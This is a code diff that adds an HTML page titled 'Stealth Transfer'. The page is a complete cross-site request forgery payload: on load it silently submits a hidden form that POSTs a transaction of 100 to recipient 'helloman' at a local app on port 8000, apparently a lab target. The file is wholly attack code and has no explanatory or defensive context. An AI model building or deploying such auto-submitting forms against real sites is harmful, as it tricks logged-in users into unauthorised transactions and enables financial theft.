@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head><title>Stealth Transfer</title></head>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost:8000/?action=create-transaction" method="POST">
+    <input type="hidden" name="recipient" value="helloman" />
+    <input type="hidden" name="amount" value="100" />
+  </form>
+</body>
+</html>
